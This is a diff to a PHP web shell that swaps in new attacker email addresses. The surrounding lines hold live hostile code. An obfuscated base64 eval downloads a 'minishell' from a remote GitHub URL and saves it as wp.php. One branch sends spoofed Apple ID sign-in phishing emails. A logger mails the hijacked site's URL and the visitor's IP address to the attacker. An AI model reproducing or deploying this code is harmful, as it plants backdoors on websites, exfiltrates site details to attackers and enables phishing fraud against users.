@@ -67,7 +67,7 @@ if(isset($_GET["sultan"])) {
 } elseif (isset($_GET['Blaze'])) {
 	eval(base64_decode('ZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CiAgICAgICAgJGZwID0gZm9wZW4oJGlzaSwgInciKTsKICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQklOQVJZVFJBTlNGRVIsIHRydWUpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZJTEUsICRmcCk7CiAgICAgICAgcmV0dXJuIGN1cmxfZXhlYygkY2gpOwogICAgICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICBvYl9mbHVzaCgpOwogICAgICAgIGZsdXNoKCk7Cn0KaWYoYWRtaW5lcignaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaW50eHBsb2l0L21pbmlzaGVsbC9tYWluL2luY2x1ZGVzLnR4dCcsJ3dwLnBocCcpKSB7CiAgICAgICAgZWNobyAiamFrYXJ0YS1ibGFja2hhdC5vcmciOwp9IGVsc2UgewogICAgICAgIGVjaG8gImxvY2FsaG9zdCI7Cn0='));
 } elseif (isset($_GET["email"])) {
-	$name = "Apple"; $to = $_GET["sultan_1337@upi.edu"]; $web="$_SERVER[HTTP_HOST]"; 
+	$name = "Apple"; $to = $_GET["perseushax0r1337@gmail.com"]; $web="$_SERVER[HTTP_HOST]"; 
 	$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
 	$email = "Apple@$web"; 
 	$headers = 'From: ' .
@@ -92,7 +92,7 @@ if(isset($_GET["sultan"])) {
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$palalokontol = 'zeusjordan779@gmail.com';
+$palalokontol = 'perseushax0r1337@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($palalokontol, "LOGGERz :", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
